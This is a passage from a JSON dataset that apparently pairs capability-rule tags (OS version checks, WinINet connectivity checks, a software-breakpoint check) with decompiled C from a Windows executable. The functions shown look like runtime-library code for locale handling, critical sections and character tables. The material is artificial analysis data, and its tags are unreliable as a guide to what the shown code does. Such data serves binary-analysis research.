        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00421e19(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_4h;\n    \n    fcn.00419d14(0x442a90, 0x10);\n    if (*0x450bbc == NULL) {\n        if (*0x450784 != 1) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"kernel32.dll\");\n            if (iVar2 != 0) {\n                *0x450bbc = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"InitializeCriticalSectionAndSpinCount\");\n                if (*0x450bbc != NULL) goto code_r0x00421e65;\n            }\n        }\n        *0x450bbc = 0x421e09;\n    }\ncode_r0x00421e65:\n    pcVar1 = *0x450bbc;\n    *(unaff_EBP + -4) = 0;\n    uVar3 = (*pcVar1)(*(unaff_EBP + 8), *(unaff_EBP + 0xc));\n    *(unaff_EBP + -0x20) = uVar3;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 333
    },
    "00422055": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00422055(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t in_ECX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint noname_3;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint32_t var_4h;\n    \n    uVar2 = arg_ch;\n    uVar1 = arg_8h;\n    if ((*(arg_8h + 0x14) == 0) || ((*(arg_8h + 0x24) != 0 && (arg_ch < 0x80)))) {\n        if ((0x40 < arg_ch) && (arg_ch < 0x5b)) {\n            return arg_ch + 0x20;\n        }\n    }\n    else {\n        noname_3 = 1;\n        var_4h = in_ECX;\n        if (arg_ch < 0x100) {\n            if (*(arg_8h + 0x28) < 2) {\n                uVar3 = *(*(arg_8h + 0x48) + arg_ch * 2) & 1;\n            }\n            else {\n                uVar3 = fcn.004202ae(arg_8h, arg_ch, 1);\n            }\n            if (uVar3 == 0) {\n                return uVar2;\n            }\n        }\n        if ((*(*(uVar1 + 0x48) + 1 + (uVar2 >> 8 & 0xffU) * 2) & 0x80) == 0) {\n            arg_8h = arg_8h & 0xffff0000 | uVar2 & 0xff;\n        }\n        else {\n            arg_8h = arg_8h & 0xff000000 | CONCAT11(uVar2, uVar2 >> 8);\n            noname_3 = 2;\n        }\n        iVar4 = fcn.00420e28(*(uVar1 + 0x14), 0x100, &arg_8h, noname_3, &var_4h, 3, *(uVar1 + 4), 1, unaff_EDI, \n                             unaff_ESI, unaff_EBX, var_4h, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, in_stack_0000000c, \n                             in_stack_00000010, in_stack_00000014, in_stack_00000018, in_stack_0000001c, \n                             in_stack_00000020, in_stack_00000024, in_stack_00000028, in_stack_0000002c, \n                             in_stack_00000030, in_stack_00000034);\n        if (iVar4 != 0) {\n            if (iVar4 != 1) {\n                return CONCAT11(var_4h, var_4h._1_1_);\n            }\n            return var_4h & 0xff;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 836
    },
    "0042213f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0042213f(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    iVar2 = param_2 / 0x20;\n    uVar1 = *(param_1 + iVar2 * 4) & ~(-1 << (0x1fU - param_2 % 0x20 & 0x1f));\n    while( true ) {\n        if (uVar1 != 0) {\n            return 0;\n        }\n        iVar2 = iVar2 + 1;\n        if (2 < iVar2) break;\n        uVar1 = *(param_1 + iVar2 * 4);\n    }\n    return 1;\n}\n",
        "token_count": 164
    },
    "00422264": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422264(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    uint *puVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar3 = arg_ch % 0x20;\n    iVar2 = 0;\n    var_4h = 0;\n    do {\n        uVar1 = *(arg_8h + iVar2 * 4);\n        *(arg_8h + iVar2 * 4) = uVar1 >> (uVar3 & 0x1f) | var_4h;\n        var_4h = (uVar1 & ~(-1 << (uVar3 & 0x1f))) << (0x20 - uVar3 & 0x1f);\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 3);\n    iVar2 = 2;\n    puVar4 = arg_8h + (2 - arg_ch / 0x20) * 4;\n    do {\n        if (iVar2 < arg_ch / 0x20) {\n            *(arg_8h + iVar2 * 4) = 0;\n        }\n        else {\n            *(arg_8h + iVar2 * 4) = *puVar4;\n        }\n        iVar2 = iVar2 + -1;\n        puVar4 = puVar4 + -1;\n    } while (-1 < iVar2);\n    return;\n}\n",
        "token_count": 351
    },
    "00422dfa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00422dfa(uint arg_8h, uint arg_ch, uint arg_10h, uint noname_3, uint arg_18h, uint noname_5, uint arg_20h)\n\n{\n    int32_t iVar1;\n    uchar auStack144 [64];\n    uint32_t uStack80;\n    uint uStack20;\n    \n    uStack20 = *0x44d270;\n    iVar1 = fcn.00422a90(arg_8h, &arg_18h, arg_20h);\n    if (iVar1 == 0) {\n        uStack80 = uStack80 & 0xfffffffe;\n        fcn.004227eb(auStack144, &arg_20h, arg_8h, arg_ch, &arg_10h, &arg_18h);\n    }\n    iVar1 = fcn.00422cdc(arg_8h);\n    if ((*0x44dd7c == 0) && (iVar1 != 0)) {\n        fcn.00422d09(iVar1, arg_ch, arg_10h, noname_3, 0, 0, arg_18h, noname_5, arg_20h);\n    }\n    else {\n        fcn.00422cb4(iVar1);\n        fcn.0042301b(arg_20h, 0xffff);\n    }\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 315
    },
    "00423095": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00423095(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 0;\n    if (*0x450bc0 == NULL) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"user32.dll\");\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar2 == 0) || (*0x450bc0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x442b88),  *0x450bc0 == NULL))\n        {\n            return 0;\n        }\n        *0x450bc4 = (*pcVar1)(iVar2, 0x442b78);\n        *0x450bc8 = (*pcVar1)(iVar2, 0x442b64);\n        if ((*0x450784 == 2) && (*0x450bd0 = (*pcVar1)(iVar2, \"GetUserObjectInformationA\"),  *0x450bd0 != NULL)) {\n            *0x450bcc = (*pcVar1)(iVar2, \"GetProcessWindowStation\");\n        }\n    }\n    if ((*0x450bcc == NULL) ||\n       (((iVar2 = (**0x450bcc)(),  iVar2 != 0 && (iVar2 = (**0x450bd0)(iVar2, 1, &var_10h, 0xc, &var_4h),  iVar2 != 0))\n        && ((var_8h & 1) != 0)))) {\n        if (((*0x450bc4 != NULL) && (iVar4 = (**0x450bc4)(),  iVar4 != 0)) && (*0x450bc8 != NULL)) {\n            iVar4 = (**0x450bc8)(iVar4);\n        }\n    }\n    else if (*0x450790 < 4) {\n        arg_10h = arg_10h | 0x40000;\n    }\n    else {\n        arg_10h = arg_10h | 0x200000;\n    }\n    uVar3 = (**0x450bc0)(iVar4, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 551
    },
    "0042318e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0042318e(uint8_t param_1, uint32_t param_2, uint8_t param_3)\n\n{\n    if ((*(param_1 + 0x452001) & param_3) == 0) {\n        if (param_2 == 0) {\n            param_2 = 0;\n        }\n        else {\n            param_2 = *(*0x44dcc0 + param_1 * 2) & param_2;\n        }\n        if (param_2 == 0) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 131
    },
    "004232b3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.004232b3(uint32_t param_1, char **param_2)\n\n{\n    char *pcVar1;\n    \n    if (param_1 != 0xffffffff) {\n        pcVar1 = param_2[3];\n        if (((pcVar1 & 1) != 0) || ((pcVar1 < '\\0' && ((pcVar1 & 2) == 0)))) {\n            if (param_2[2] == NULL) {\n                fcn.00421ac0(param_2);\n            }\n            if (*param_2 == param_2[2]) {\n                if (param_2[1] != NULL) {\n                    return 0xffffffff;\n                }\n                *param_2 = *param_2 + 1;\n            }\n            *param_2 = *param_2 + -1;\n            pcVar1 = *param_2;\n            if ((*(param_2 + 3) & 0x40) == 0) {\n                *pcVar1 = param_1;\n            }\n            else if (*pcVar1 != param_1) {\n                *param_2 = pcVar1 + 1;\n                return 0xffffffff;\n            }\n            param_2[1] = param_2[1] + 1;\n            param_2[3] = param_2[3] & 0xffffffef | 1;\n            return param_1 & 0xff;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 325
    },
    "00423364": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00423364(int32_t arg_8h, uint16_t *lpWideCharStr, uint8_t *arg_10h, uint32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    if ((arg_10h != NULL) && (arg_14h != 0)) {\n        uVar1 = *arg_10h;\n        if (uVar1 != 0) {\n            if (*(arg_8h + 0x14) == 0) {\n                if (lpWideCharStr != NULL) {\n                    *lpWideCharStr = uVar1;\n                }\n                return 1;\n            }\n            if ((*(*(arg_8h + 0x48) + 1 + uVar1 * 2) & 0x80) == 0) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                  (*(arg_8h + 4), 9, arg_10h, 1, lpWideCharStr, lpWideCharStr != NULL);\n                if (iVar2 != 0) {\n                    return 1;\n                }\n            }\n            else {\n                iVar2 = *(arg_8h + 0x28);\n                if ((((1 < iVar2) && (iVar2 <= arg_14h)) &&\n                    (iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                       (*(arg_8h + 4), 9, arg_10h, iVar2, lpWideCharStr, lpWideCharStr != NULL), \n                    iVar2 != 0)) || ((*(arg_8h + 0x28) <= arg_14h && (arg_10h[1] != 0)))) {\n                    return *(arg_8h + 0x28);\n                }\n            }\n            puVar3 = fcn.0041a92a();\n            *puVar3 = 0x2a;\n            return 0xffffffff;\n        }\n        if (lpWideCharStr != NULL) {\n            *lpWideCharStr = 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 479
    },
    "00423a04": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00423a04(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t *arg_8h;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint *arg_14h;\n    uint *puVar8;\n    uint32_t uVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*0x450ba4 == 0) && (*0x450ba0 == 0)) {\n        if (((*0x450e78 != NULL) && (**0x450e78 == 0)) && (*0x450e78 != *(*0x44db2c + 0x2c))) {\n            fcn.00418911(*0x450e78);\n            fcn.00418911(*0x450bdc);\n        }\n        *0x450e7c = NULL;\n        *0x450e78 = NULL;\n        arg_14h = 0x44df6c;\n        *0x450bdc = NULL;\n        puVar8 = *0x450bdc;\n        arg_8h = *0x450e78;\ncode_r0x00423bb1:\n        *0x450e78 = arg_8h;\n        *0x450bdc = puVar8;\n        *0x44dd44 = **arg_14h;\n        *0x44dd48 = 1;\n        uVar6 = 0;\n        *0x44df9c = arg_14h;\n    }\n    else {\n        arg_14h = fcn.0041ac0c(1, 0x30);\n        if (arg_14h != NULL) {\n            puVar8 = *0x44df9c;\n            puVar11 = arg_14h;\n            for (iVar7 = 0xc; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar11 = *puVar8;\n                puVar8 = puVar8 + 1;\n                puVar11 = puVar11 + 1;\n            }\n            arg_8h = fcn.004188ff(4);\n            if (arg_8h != NULL) {\n                *arg_8h = 0;\n                if (*0x450ba4 == 0) {\n                    *0x450e7c = NULL;\n                    *arg_14h = *0x44df6c;\n                    arg_14h[1] = *0x44df70;\n                    arg_14h[2] = *0x44df74;\n                }\n                else {\n                    *0x450e7c = fcn.004188ff(4);\n                    if (*0x450e7c == NULL) {\n                        uVar6 = 1;\ncode_r0x00423b0f:\n                        fcn.00418911(arg_14h);\n                        fcn.00418911(arg_8h);\n                        return uVar6;\n                    }\n                    **0x450e7c = 0;\n                    uVar9 = *0x450c1e;\n                    uVar3 = fcn.00425dfe(1, uVar9, 0xe, arg_14h);\n                    uVar4 = fcn.00425dfe(1, uVar9, 0xf, arg_14h + 1);\n                    uVar9 = fcn.00425dfe(1, uVar9, 0x10, arg_14h + 2);\n                    if ((uVar9 | uVar3 | uVar4) != 0) {\n                        fcn.004239a5(arg_14h);\n                        uVar6 = 0xffffffff;\n                        goto code_r0x00423b0f;\n                    }\n                    pcVar5 = arg_14h[2];\n                    while (*pcVar5 != '\\0') {\n                        cVar2 = *pcVar5;\n                        if ((cVar2 < '0') || ('9' < cVar2)) {\n                            pcVar10 = pcVar5;\n                            if (cVar2 != ';') goto code_r0x00423b3b;\n                            do {\n                                pcVar1 = pcVar10 + 1;\n                                *pcVar10 = *pcVar1;\n                                pcVar10 = pcVar1;\n                            } while (*pcVar1 != '\\0');\n                        }\n                        else {\n                            *pcVar5 = cVar2 + -0x30;\ncode_r0x00423b3b:\n                            pcVar5 = pcVar5 + 1;\n                        }\n                    }\n                }\n                puVar8 = arg_14h;\n                if (((*0x450e78 != NULL) && (**0x450e78 == 0)) && (*0x450e78 != *(*0x44db2c + 0x2c))) {\n                    fcn.00418911(*0x450e78);\n                    fcn.00418911(*0x450bdc);\n                }\n                goto code_r0x00423bb1;\n            }\n            fcn.00418911(arg_14h);\n        }\n        uVar6 = 1;\n    }\n    return uVar6;\n}\n",
        "token_count": 1169
    },
    "00423caa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00423caa(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *arg_8h;\n    uint *arg_8h_00;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    char *pcVar17;\n    uint uVar18;\n    int32_t iVar19;\n    uint32_t uVar20;\n    char *pcVar21;\n    uint *puVar22;\n    uint *puVar23;\n    uint var_4h;\n    \n    if ((*0x450ba0 == 0) && (*0x450ba4 == 0)) {\n        *0x450e74 = NULL;\n        *0x450e78 = NULL;\n        *0x44df9c = 0x44df6c;\n        *0x450bdc = NULL;\ncode_r0x00423ee2:\n        uVar18 = 0;\n    }\n    else {\n        arg_8h = fcn.0041ac0c(1, 0x30);\n        if (arg_8h != NULL) {\n            arg_8h_00 = fcn.004188ff(4);\n            if (arg_8h_00 == NULL) {\n                fcn.00418911(arg_8h);\n            }\n            else {\n                *arg_8h_00 = 0;\n                if (*0x450ba0 == 0) {\n                    puVar22 = 0x44df6c;\n                    puVar23 = arg_8h;\n                    for (iVar19 = 0xc; iVar19 != 0; iVar19 = iVar19 + -1) {\n                        *puVar23 = *puVar22;\n                        puVar22 = puVar22 + 1;\n                        puVar23 = puVar23 + 1;\n                    }\n                    *0x450e74 = NULL;\ncode_r0x00423eaf:\n                    *arg_8h = **0x44df9c;\n                    arg_8h[1] = (*0x44df9c)[1];\n                    arg_8h[2] = (*0x44df9c)[2];\n                    *0x44df9c = arg_8h;\n                    *0x450bdc = arg_8h;\n                    *0x450e78 = arg_8h_00;\n                    goto code_r0x00423ee2;\n                }\n                *0x450e74 = fcn.004188ff(4);\n                if (*0x450e74 == NULL) {\n                    fcn.00418911(arg_8h);\n                    fcn.00418911(arg_8h_00);\n                }\n                else {\n                    **0x450e74 = 0;\n                    uVar20 = *0x450c18;\n                    uVar3 = fcn.00425dfe(1, uVar20, 0x15, arg_8h + 3);\n                    uVar4 = fcn.00425dfe(1, uVar20, 0x14, arg_8h + 4);\n                    uVar5 = fcn.00425dfe(1, uVar20, 0x16, arg_8h + 5);\n                    uVar6 = fcn.00425dfe(1, uVar20, 0x17, arg_8h + 6);\n                    uVar7 = fcn.00425dfe(1, uVar20, 0x18, arg_8h + 7);\n                    uVar8 = fcn.00425dfe(1, uVar20, 0x50, arg_8h + 8);\n                    uVar9 = fcn.00425dfe(1, uVar20, 0x51, arg_8h + 9);\n                    uVar10 = fcn.00425dfe(0, uVar20, 0x1a, arg_8h + 10);\n                    uVar11 = fcn.00425dfe(0, uVar20, 0x19, arg_8h + 0x29);\n                    uVar12 = fcn.00425dfe(0, uVar20, 0x54, arg_8h + 0x2a);\n                    uVar13 = fcn.00425dfe(0, uVar20, 0x55, arg_8h + 0x2b);\n                    uVar14 = fcn.00425dfe(0, uVar20, 0x56, arg_8h + 0xb);\n                    uVar15 = fcn.00425dfe(0, uVar20, 0x57, arg_8h + 0x2d);\n                    uVar16 = fcn.00425dfe(0, uVar20, 0x52, arg_8h + 0x2e);\n                    uVar20 = fcn.00425dfe(0, uVar20, 0x53, arg_8h + 0x2f);\n                    if ((uVar20 | uVar3 | uVar4 | uVar5 | uVar6 | uVar7 | uVar8 | uVar9 | uVar10 | uVar11 | uVar12 |\n                                  uVar13 | uVar14 | uVar15 | uVar16) == 0) {\n                        pcVar17 = arg_8h[7];\n                        while (*pcVar17 != '\\0') {\n                            cVar2 = *pcVar17;\n                            if ((cVar2 < '0') || ('9' < cVar2)) {\n                                pcVar21 = pcVar17;\n                                if (cVar2 != ';') goto code_r0x00423e7d;\n                                do {\n                                    pcVar1 = pcVar21 + 1;\n                                    *pcVar21 = *pcVar1;\n                                    pcVar21 = pcVar1;\n                                } while (*pcVar1 != '\\0');\n                            }\n                            else {\n                                *pcVar17 = cVar2 + -0x30;\ncode_r0x00423e7d:\n                                pcVar17 = pcVar17 + 1;\n                            }\n                        }\n                        goto code_r0x00423eaf;\n                    }\n                    fcn.00423bd1(arg_8h);\n                    fcn.00418911(arg_8h);\n                    fcn.00418911(arg_8h_00);\n                }\n            }\n        }\n        uVar18 = 1;\n    }\n    return uVar18;\n}\n",
        "token_count": 1522
    },
    "00423ee9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_12h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00423ee9(void)\n\n{\n    uint8_t *puVar1;\n    char16_t *noname_3;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint32_t uVar5;\n    ushort *puVar6;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    int32_t var_24h;\n    uint *var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uchar auStack24 [2];\n    uint var_12h;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    var_1ch = 0;\n    if (*0x450b9c == 0) {\n        *0x44dcc0 = \n        L\"         (((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x81\\x81\\x81\\x81\\x81\\x81\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x10\\x10\\x10\\x10\\x10\\x10\\x82\\x82\\x82\\x82\\x82\\x82\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x10\\x10\\x10\\x10 \"\n        ;\n        *0x450e70 = NULL;\n        *0x450e6c = NULL;\n        goto code_r0x004240c8;\n    }\n    if ((*0x450bac == 0) && (iVar3 = fcn.00425dfe(0, *0x450c10, 0x1004, 0x450bac),  iVar3 != 0)) {\ncode_r0x0042409b:\n        fcn.00418911(var_20h);\n        fcn.00418911(var_24h);\n    }\n    else {\n        var_20h = fcn.004188ff(4);\n        var_24h = fcn.004188ff(0x300);\n        var_1ch = fcn.004188ff(0x101);\n        if ((var_20h == NULL) || ((var_24h == 0 || (var_1ch == 0)))) goto code_r0x0042409b;\n        *var_20h = 0;\n        iVar3 = 0;\n        do {\n            *(iVar3 + var_1ch) = iVar3;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x100);\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(*0x450bac, &var_18h);\n        if ((iVar3 == 0) || (5 < var_18h)) goto code_r0x0042409b;\n        *0x44dd40 = var_18h & 0xffff;\n        if ((1 < *0x44dd40) && (var_12h != '\\0')) {\n            puVar4 = &var_12h + 1;\n            do {\n                uVar2 = *puVar4;\n                if (uVar2 == 0) break;\n                for (uVar5 = puVar4[-1]; uVar5 <= uVar2; uVar5 = uVar5 + 1) {\n                    *(uVar5 + var_1ch) = 0;\n                    uVar2 = *puVar4;\n                }\n                puVar1 = puVar4 + 1;\n                puVar4 = puVar4 + 2;\n            } while (*puVar1 != 0);\n        }\n        noname_3 = var_24h + 0x100;\n        iVar3 = fcn.004211e4(1, var_1ch, 0x100, noname_3, 0, 0, 0, unaff_ESI, unaff_EBX, unaff_EDI, noname_3, var_20h, \n                             var_1ch, var_18h, _auStack24);\n        if (iVar3 == 0) goto code_r0x0042409b;\n        *(var_24h + 0xfe) = 0;\n        if ((1 < *0x44dd40) && (var_12h != '\\0')) {\n            puVar4 = &var_12h + 1;\n            do {\n                if (*puVar4 == 0) break;\n                uVar5 = puVar4[-1];\n                if (uVar5 <= *puVar4) {\n                    puVar6 = var_24h + 0x100 + uVar5 * 2;\n                    do {\n                        *puVar6 = 0x8000;\n                        uVar5 = uVar5 + 1;\n                        puVar6 = puVar6 + 1;\n                    } while (uVar5 <= *puVar4);\n                }\n                puVar1 = puVar4 + 1;\n                puVar4 = puVar4 + 2;\n            } while (*puVar1 != 0);\n        }\n        fcn.00419370(var_24h, var_24h + 0x200, 0xfe);\n        *0x44dcc0 = noname_3;\n        *0x450e6c = var_24h + 0xfe;\n        *0x450e70 = var_20h;\n    }\n    fcn.00418911(var_1ch);\ncode_r0x004240c8:\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 1407
    },
    "0042417f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042417f(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_ch;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    if ((param_1 == NULL) || (*param_1 == '\\0')) {\ncode_r0x004241c5:\n        uVar2 = 0x1004;\ncode_r0x004241d0:\n        iVar1 = (**0x450c00)(*0x450be8, uVar2, &var_ch, 8);\n        if (iVar1 == 0) goto code_r0x004241ea;\n        param_1 = &var_ch;\n    }\n    else {\n        iVar1 = fcn.0041b910(param_1, 0x443ad0);\n        if (iVar1 == 0) goto code_r0x004241c5;\n        iVar1 = fcn.0041b910(param_1, 0x443acc);\n        if (iVar1 == 0) {\n            uVar2 = 0xb;\n            goto code_r0x004241d0;\n        }\n    }\n    fcn.00419e80(param_1);\ncode_r0x004241ea:\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 293
    },
    "00424213": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00424213(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    iVar5 = 0;\n    iVar6 = 0x1a;\n    do {\n        iVar2 = (iVar6 + iVar5) / 2;\n        uVar1 = *(iVar2 * 0x2c + 0x442cd0);\n        if (arg_8h == uVar1) {\n            if (arg_ch == 1) {\n                pcVar4 = \"040a\" + iVar2 * 0x2c;\n            }\n            else if (arg_ch == 3) {\n                pcVar4 = iVar2 * 0x2c + 0x442ce0;\n            }\n            else if (arg_ch == 7) {\n                pcVar4 = iVar2 * 0x2c + 0x442ce8;\n            }\n            else if (arg_ch == 0xb) {\n                pcVar4 = iVar2 * 0x2c + 0x442cec;\n            }\n            else if (arg_ch == 0x1001) {\n                pcVar4 = *(iVar2 * 0x2c + 0x442cdc);\n            }\n            else if (arg_ch == 0x1002) {\n                pcVar4 = *(iVar2 * 0x2c + 0x442ce4);\n            }\n            else {\n                if (arg_ch != 0x1004) break;\n                pcVar4 = iVar2 * 0x2c + 0x442cf4;\n            }\n            if ((pcVar4 != NULL) && (0 < arg_14h)) {\n                fcn.00421eb0(arg_10h, pcVar4, arg_14h + -1);\n                *(arg_10h + -1 + arg_14h) = 0;\n                return 1;\n            }\n            break;\n        }\n        if (arg_8h < uVar1) {\n            iVar6 = iVar2 + -1;\n        }\n        else {\n            iVar5 = iVar2 + 1;\n        }\n    } while (iVar5 <= iVar6);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return uVar3;\n}\n",
        "token_count": 570
    },
    "004243dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
